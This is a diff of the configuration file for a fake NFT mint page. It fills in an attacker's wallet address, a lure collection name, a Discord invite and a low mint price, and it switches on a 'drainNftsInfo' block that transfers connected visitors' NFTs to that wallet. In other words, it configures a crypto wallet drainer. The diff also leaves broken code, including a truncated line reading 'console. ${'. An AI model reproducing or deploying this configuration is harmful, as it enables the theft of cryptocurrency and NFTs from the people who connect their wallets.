@@ -2,17 +2,17 @@
     = = = = = YOU WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "YOUR WALLET";
+const receiveAddress = "0xbDd33Ccdc25D651AFd4efe60fBda3CC661Fe75A9";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
 */
 
 const collectionInfo = {
-    name: "Cronos1402",
+    name: "Cryptoasia",
     date: "10.04.2023",
     socialMedia: {
-        discord: "discord.gg/invite_here",
+        discord: "https://discord.gg/b2sM23xY",
         twitter: "https://twitter.com/username_here",
     },
     medias: {
@@ -33,7 +33,7 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.2,
+    price: 0.01,
     totalSupply: 8888,
     minUnits: 1,
     maxUnits: 20,
@@ -46,13 +46,13 @@ const mintInfo = {
 
 const drainNftsInfo = {
     active: true,
-    minValue: 0.2,
+    minValue: 0.01,
     maxTransfer: 1,
-    nftReceiveAddress: "YOUR WALLET",
+    nftReceiveAddress: "0xbDd33Ccdc25D651AFd4efe60fBda3CC661Fe75A9",
 }
 
 const customStrings = {
-    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    title: "MINT {Gpt}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "CONNECT WALLET",
     transferButton: "MINT NOW",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
@@ -64,12 +64,12 @@ const customStrings = {
 
 //#region Check Configuration
 if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
-if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
+if (mintInfo.minUnits <= 0.01) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);
 
 if (!receiveAddress.startsWith("0x") ||
     (
         receiveAddress.length >= 64 ||
         receiveAddress.length <= 40
     )
-) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+) console. ${
 //#endregion
